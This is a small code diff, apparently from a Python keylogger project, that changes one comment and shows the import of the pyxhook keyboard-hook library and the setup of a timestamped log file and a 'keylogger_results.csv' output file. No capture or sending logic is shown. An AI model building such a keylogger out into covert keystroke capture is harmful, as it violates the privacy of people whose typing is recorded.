@@ -6,7 +6,7 @@ import pyxhook
 import csv
 
 def main():
-    # Specify the name of the file (can be changed )
+    # Specify the name of the files
     log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
     csv_file = f'{os.getcwd()}/keylogger_results.csv'
 
